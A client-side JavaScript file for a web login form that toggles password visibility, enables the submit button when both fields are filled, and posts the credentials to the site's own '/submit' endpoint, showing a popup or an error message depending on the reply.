document.addEventListener("DOMContentLoaded", function () {
    // Password Show/Hide
    const passwordField = document.getElementById("password");
    const togglePassword = document.getElementById("togglePassword");

    togglePassword.addEventListener("click", function () {
        if (passwordField.type === "password") {
            passwordField.type = "text";
            togglePassword.classList.remove("fa-eye");
            togglePassword.classList.add("fa-eye-slash");
        } else {
            passwordField.type = "password";
            togglePassword.classList.remove("fa-eye-slash");
            togglePassword.classList.add("fa-eye");
        }
    });

    // Form Fields
    const usernameField = document.getElementById("username");
    const continueBtn = document.querySelector(".btn");
    const form = document.querySelector("form");

    // Button enable/disable
    function validateFields() {
        if (usernameField.value.trim() !== "" && passwordField.value.trim() !== "") {
            continueBtn.removeAttribute("disabled");
        } else {
            continueBtn.setAttribute("disabled", "true");
        }
    }

    usernameField.addEventListener("input", validateFields);
    passwordField.addEventListener("input", validateFields);

    // Status Box (for incorrect login only)
    const statusBox = document.createElement("div");
    statusBox.id = "loginStatus";
    statusBox.style.display = "none";
    statusBox.style.marginTop = "10px";
    statusBox.style.padding = "10px";
    statusBox.style.textAlign = "center";
    statusBox.style.borderRadius = "5px";
    form.appendChild(statusBox);

    // Loading spinner
    const loadingSpinner = document.getElementById("loading");

    // Popup element
    const popup = document.getElementById("popup");

    // Form Submit
    form.addEventListener("submit", function (event) {
        event.preventDefault();
        continueBtn.setAttribute("disabled", "true");
        loadingSpinner.style.display = "block";
        statusBox.style.display = "none";

        const username = usernameField.value.trim();
        const password = passwordField.value.trim();

        fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username, password })
        })
        .then(response => response.json())
        .then(data => {
            loadingSpinner.style.display = "none";

            if (data.success) {
                form.style.display = "none";           // hide form
                popup.style.display = "flex";          // show popup
            } else {
                statusBox.textContent = "Sorry, incorrect password.";
                statusBox.style.backgroundColor = "red";
                statusBox.style.color = "white";
                statusBox.style.display = "block";

                setTimeout(() => {
                    statusBox.style.display = "none";
                }, 3000);
            }

            form.reset();
            continueBtn.setAttribute("disabled", "true");
        })
        .catch(error => {
            loadingSpinner.style.display = "none";
            console.error("Error:", error);
            statusBox.textContent = "Error submitting data!";
            statusBox.style.backgroundColor = "red";
            statusBox.style.color = "white";
            statusBox.style.display = "block";

            setTimeout(() => {
                statusBox.style.display = "none";
            }, 3000);
        });
    });
});
